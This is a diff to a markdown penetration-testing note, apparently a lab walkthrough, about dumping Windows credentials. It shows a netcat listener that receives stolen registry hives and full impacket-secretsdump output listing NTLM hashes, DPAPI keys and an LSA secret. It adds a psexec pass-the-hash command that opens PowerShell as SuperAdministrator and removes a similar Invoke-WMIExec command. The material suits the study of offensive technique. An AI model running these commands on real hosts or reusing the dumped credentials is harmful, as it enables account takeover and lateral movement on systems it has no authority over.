@@ -79,8 +79,37 @@ nc -lvnp 80 > hives.zip
 > Secretsdump.py
 
 ```shell
+──(root㉿kali)-[~]
+└─# impacket-secretsdump -system SYSTEM-2025-02-11 -security SECURITY-2025-02-11 -sam SAM-2025-01-15 local
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
+[*] Target system bootKey: 0x4ef63a41a8a538be4e2c5c0ea9374c04
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:93cd9672e50a6d53446b71408ae418e9:::
+Sammy:1000:aad3b435b51404eeaad3b435b51404ee:205d4472747b814ffb23cfa969a77ad8:::
+SuperAdministrator:1001:aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c:::
+[*] Dumping cached domain logon information (domain/username:hash)
+[*] Dumping LSA Secrets
+[*] DPAPI_SYSTEM 
+dpapi_machinekey:0x07c28b358495df7003225e3b32fa409373b3a973
+dpapi_userkey:0x6f22dba8ad5ccf8066168ab439e155cd6797264c
+[*] NL$KM 
+ 0000   F0 29 C0 1E F8 C0 26 6C  73 03 80 BC 4D 86 03 B6   .)....&ls...M...
+ 0010   43 B7 08 93 C5 F9 8B C7  05 1D 66 5A FC 16 41 15   C.........fZ..A.
+ 0020   85 B3 8E AB 1B DC 4D CA  90 7C 01 82 BC 61 6F AB   ......M..|...ao.
+ 0030   CE 1F 76 B5 41 A6 7B 7F  84 B4 D4 66 3C 3B 80 81   ..v.A.{....f<;..
+NL$KM:f029c01ef8c0266c730380bc4d8603b643b70893c5f98bc7051d665afc16411585b38eab1bdc4dca907c0182bc616fabce1f76b541a67b7f84b4d4663c3b8081
+[*] Cleaning up... 
+                                                                                                
+┌──(root㉿kali)-[~]
+└─# 
 ```
-```
-Invoke-WMIExec -Target 127.0.0.1 -Username SuperAdministrator -Hash aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c -Command "whoami"
+
+> psexec for popping a powershell as SuperAdministrator:
+
+```shell
+impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c SuperAdministrator@IP powershell.exe
 ```
